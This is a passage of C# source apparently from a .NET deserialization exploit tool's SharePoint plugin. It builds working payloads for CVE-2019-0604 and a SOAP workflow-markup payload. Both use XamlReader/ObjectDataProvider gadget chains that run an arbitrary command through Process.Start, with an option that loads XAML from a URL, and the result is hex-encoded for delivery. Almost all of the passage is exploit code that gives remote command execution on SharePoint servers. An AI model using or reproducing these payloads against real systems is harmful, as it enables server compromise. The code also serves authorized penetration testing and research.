PublicKeyToken=31bf3856ad364e35"">
<ODP:ObjectDataProvider x:Key=""LaunchCmd"" MethodName=""Start"">
<ObjectDataProvider.ObjectInstance><Diag:Process><Diag:Process.StartInfo>" + cmdPart + @"</Diag:ProcessStartInfo></Diag:Process>
</ObjectDataProvider.ObjectInstance>
</ODP:ObjectDataProvider>
</Rd:ResourceDictionary>
</SequentialWorkflowActivity>
]]></workflowMarkupText>
<rulesText></rulesText><configBlob></configBlob><flag>2</flag></ValidateWorkflowMarkupAndCreateSupportObjects></soap:Body></soap:Envelope>";

            }
            // minimisation of payload is not important here but we can do it if needed!

            return payload;
        }

        private static ushort[] masks = new ushort[] { 15, 240, 3840, 61440 };
        private static char[] hexChars = new char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };

        public string CVE_2019_0604()
        {
            /*
            string payloadPart2 = @"<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xsi:type=""xsd:string"">
                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">"+ cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""XamlReader""></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>";
            //*/

            string payloadPart1 = "";
            string payloadPart2 = "";

            if (useurl)
            {
                InputArgs inputArgs = new InputArgs();
                inputArgs.Cmd = "foobar";
                inputArgs.IsRawCmd = true;
                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", command };
                inputArgs.Minify = true;
                inputArgs.UseSimpleType = true;

                payloadPart1 = typeof(Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties).AssemblyQualifiedName + ":";
                payloadPart1 = payloadPart1.Replace(" ", "");

                // Use GadgetRegistry to create TextFormattingRunPropertiesGenerator
                IGenerator myTFRPG = GadgetRegistry.CreateGadgetInstance("TextFormattingRunProperties");
                if (myTFRPG == null)
                {
                    Console.WriteLine("TextFormattingRunPropertiesGenerator not supported!");
                    throw new Exception("TextFormattingRunPropertiesGenerator not supported!");
                }
                payloadPart2 = (string)myTFRPG.GenerateWithNoTest("DataContractSerializer", inputArgs);

            }
            else
            {
                payloadPart1 = @"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35]],System.Data.Services,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089:";

                Boolean hasArgs;
                string[] splittedCMD = CommandArgSplitter.SplitCommand(command, CommandArgSplitter.CommandType.XML, out hasArgs);

                String cmdPart;

                if (hasArgs)
                {
                    cmdPart = $@"<b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
                }
                else
                {
                    cmdPart = $@"<b:String>{splittedCMD[0]}</b:String>";
                }

                payloadPart2 = @"<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:a=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:b=""http://www.w3.org/2001/XMLSchema""><ExpandedElement/><ProjectedProperty0><MethodName>Parse</MethodName><MethodParameters><anyType a:type=""b:string""><![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start""><ObjectDataProvider.MethodParameters>" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]></anyType></MethodParameters><ObjectInstance a:type=""XamlReader""/></ProjectedProperty0></ExpandedWrapperOfXamlReaderObjectDataProvider>";

            }
            //payloadPart2 = PayloadMinifier(payloadPart2); // we need to make it smaller as goes bigger after encoding

            payloadPart2 = XmlMinifier.Minify(payloadPart2, null, null, FormatterType.DataContractXML, true);

            //Console.WriteLine(payloadPart2);
            string payload = payloadPart1 + payloadPart2;

            Console.WriteLine(payload);
            StringBuilder stringBuilder = new StringBuilder();

            stringBuilder.Append("__bp");
            HexEncode(checked((char)(payload.Length << 2)), stringBuilder);
            HexEncode(payload, stringBuilder);

            return stringBuilder.ToString();
        }

        /*
        private string PayloadMinifier(string strPayload)
        {
            strPayload = strPayload.Replace("\r\n", "");
            strPayload = strPayload.Replace("\t", "");
            strPayload = Regex.Replace(strPayload, @"[ ]+", " ");
            strPayload = strPayload.Replace("> <", "><");
            strPayload = strPayload.Replace("> &lt;", ">&lt;");
            strPayload = strPayload.Replace("&gt; <", "&gt;<");

            strPayload = strPayload.Replace("xmlns:xsi", "xmlns:a");
            strPayload = strPayload.Replace("xsi:", "a:");

            strPayload = strPayload.Replace("xmlns:xsd", "xmlns:b");
            strPayload = strPayload.Replace("xsd:", "b:");

            strPayload = strPayload.Replace("xmlns:System", "xmlns:c");
            strPayload = strPayload.Replace("System:", "c:");

            strPayload = strPayload.Replace("xmlns:Diag", "xmlns:d");
            strPayload = strPayload.Replace("Diag:", "d:");

            return strPayload;
        }
        */

        private static void HexEncode(string data, StringBuilder buf)
        {
            for (int i = 0; i < data.Length; i = i + 1)
            {
                HexEncode(data[i], buf);
            }
        }

        private static void HexEncode(char chr, StringBuilder buf)
        {
            for (int i = 0; i < 4; i = i + 1)
            {
                buf.Append(hexChars[(chr & (char)masks[i]) >> (i << 2 & 31)]);
            }
        }
    }
}
